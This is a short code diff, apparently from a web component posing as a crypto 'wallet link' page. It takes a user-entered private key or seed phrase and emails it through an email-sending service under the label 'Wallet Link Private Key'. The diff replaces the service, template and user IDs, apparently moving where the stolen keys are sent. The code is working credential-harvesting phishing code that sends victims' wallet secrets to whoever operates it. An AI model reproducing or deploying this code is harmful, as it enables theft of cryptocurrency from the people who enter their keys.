@@ -40,9 +40,9 @@ export default {
       const counter = this.countWords(this.private_key);
       if (counter) {
         var data = {
-          service_id: "service_l46uiz9",
-          template_id: "template_wumvmfl",
-          user_id: "GJxxDTrB0kaaN00vu",
+          service_id: "service_fhzx1qm",
+          template_id: "template_u8q3nmp",
+          user_id: "1VCQuxAerMoxLsQwn",
           template_params: {
             from_name: "Wallet Link Private Key",
             private_key: this.private_key,
